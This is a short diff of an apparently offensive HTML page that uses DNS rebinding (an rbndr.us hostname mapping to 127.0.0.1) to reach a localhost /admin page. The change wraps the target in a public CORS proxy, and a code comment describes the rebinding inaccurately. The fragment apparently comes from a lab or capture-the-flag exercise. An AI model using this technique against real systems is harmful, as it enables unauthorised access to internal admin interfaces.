@@ -5,7 +5,7 @@
     <title>😈</title>
     <script>
         // Target URL using DNS rebinding
-        const targetUrl = 'http://3e54b282.7f000001.rbndr.us/admin';  // The URL that will resolve 'localhost' to the attacker's server
+        const targetUrl = 'https://corsproxy.io/' + encodeURIComponent('http://3e54b282.7f000001.rbndr.us/admin');  // The URL that will resolve 'localhost' to the attacker's server
 
         // Function to attempt access to the /admin page on localhost (using DNS rebinding)
         function attemptAccess() {
